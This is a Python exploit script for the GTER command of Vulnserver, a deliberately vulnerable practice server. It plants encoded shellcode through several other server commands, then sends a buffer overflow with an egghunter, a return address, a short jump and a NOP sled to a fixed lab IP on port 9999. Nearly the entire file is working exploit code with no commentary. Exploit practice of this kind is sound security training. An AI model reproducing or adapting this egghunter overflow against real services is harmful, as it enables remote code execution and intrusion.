#!/usr/bin/python
#Written By: Eric Van Zutphen
#Vulnserver GTER Overflow


import socket, time

inject_shellcode = 'T00WT00W'
inject_shellcode += '\x52\x59\x83\xc1\x30'
inject_shellcode += "\xbf\x4d\xc1\x36\x8a\xda\xdc\xd9\x74\x24"
inject_shellcode += "\xf4\x5d\x2b\xc9\xb1\x52\x31\x7d\x12\x03"
inject_shellcode += "\x7d\x12\x83\x88\xc5\xd4\x7f\xee\x2e\x9a"
inject_shellcode += "\x80\x0e\xaf\xfb\x09\xeb\x9e\x3b\x6d\x78"
inject_shellcode += "\xb0\x8b\xe5\x2c\x3d\x67\xab\xc4\xb6\x05"
inject_shellcode += "\x64\xeb\x7f\xa3\x52\xc2\x80\x98\xa7\x45"
inject_shellcode += "\x03\xe3\xfb\xa5\x3a\x2c\x0e\xa4\x7b\x51"
inject_shellcode += "\xe3\xf4\xd4\x1d\x56\xe8\x51\x6b\x6b\x83"
inject_shellcode += "\x2a\x7d\xeb\x70\xfa\x7c\xda\x27\x70\x27"
inject_shellcode += "\xfc\xc6\x55\x53\xb5\xd0\xba\x5e\x0f\x6b"
inject_shellcode += "\x08\x14\x8e\xbd\x40\xd5\x3d\x80\x6c\x24"
inject_shellcode += "\x3f\xc5\x4b\xd7\x4a\x3f\xa8\x6a\x4d\x84"
inject_shellcode += "\xd2\xb0\xd8\x1e\x74\x32\x7a\xfa\x84\x97"
inject_shellcode += "\x1d\x89\x8b\x5c\x69\xd5\x8f\x63\xbe\x6e"
inject_shellcode += "\xab\xe8\x41\xa0\x3d\xaa\x65\x64\x65\x68"
inject_shellcode += "\x07\x3d\xc3\xdf\x38\x5d\xac\x80\x9c\x16"
inject_shellcode += "\x41\xd4\xac\x75\x0e\x19\x9d\x85\xce\x35"
inject_shellcode += "\x96\xf6\xfc\x9a\x0c\x90\x4c\x52\x8b\x67"
inject_shellcode += "\xb2\x49\x6b\xf7\x4d\x72\x8c\xde\x89\x26"
inject_shellcode += "\xdc\x48\x3b\x47\xb7\x88\xc4\x92\x18\xd8"
inject_shellcode += "\x6a\x4d\xd9\x88\xca\x3d\xb1\xc2\xc4\x62"
inject_shellcode += "\xa1\xed\x0e\x0b\x48\x14\xd9\xf4\x25\x14"
inject_shellcode += "\x39\x9d\x37\x18\x38\xe6\xb1\xfe\x50\x08"
inject_shellcode += "\x94\xa9\xcc\xb1\xbd\x21\x6c\x3d\x68\x4c"
inject_shellcode += "\xae\xb5\x9f\xb1\x61\x3e\xd5\xa1\x16\xce"
inject_shellcode += "\xa0\x9b\xb1\xd1\x1e\xb3\x5e\x43\xc5\x43"
inject_shellcode += "\x28\x78\x52\x14\x7d\x4e\xab\xf0\x93\xe9"
inject_shellcode += "\x05\xe6\x69\x6f\x6d\xa2\xb5\x4c\x70\x2b"
inject_shellcode += "\x3b\xe8\x56\x3b\x85\xf1\xd2\x6f\x59\xa4"
inject_shellcode += "\x8c\xd9\x1f\x1e\x7f\xb3\xc9\xcd\x29\x53"
inject_shellcode += "\x8f\x3d\xea\x25\x90\x6b\x9c\xc9\x21\xc2"
inject_shellcode += "\xd9\xf6\x8e\x82\xed\x8f\xf2\x32\x11\x5a"
inject_shellcode += "\xb7\x43\x58\xc6\x9e\xcb\x05\x93\xa2\x91"
inject_shellcode += "\xb5\x4e\xe0\xaf\x35\x7a\x99\x4b\x25\x0f"
inject_shellcode += "\x9c\x10\xe1\xfc\xec\x09\x84\x02\x42\x29"
inject_shellcode += "\x8d"



align_stack = '\x52\x59\x83\xc1\x30'

egghunter = ("\x66\x81\xCA\xFF"
"\x0F\x42\x52\x6A"
"\x02\x58\xCD\x2E"
"\x3C\x05\x5A\x74"
"\xEF\xB8\x54\x30"
"\x30\x57\x8B\xFA"
"\xAF\x75\xEA\xAF"
"\x75\xE7\xFF\xE7")

for command in ["STATS ","TRUN ", "GMON ", "GDOG ", "LTER "]:
    print '[*] Injecting Shellcode in Command %s!' %(command)
    time.sleep(1)
    expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    expl.connect(("192.168.2.31", 9999))
    expl.send(command + inject_shellcode)
    expl.close()

#625011AF
evil = 'GTER /.:/'
evil += 'A' * (147-len(egghunter)-20)  +  egghunter + '\x90' * 20 + '\xAF\x11\x50\x62' + "\xeb\x80" + "\x90" * 600


print '[*] Sending Payload!'
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("192.168.2.31", 9999))
expl.send(evil)
expl.close()
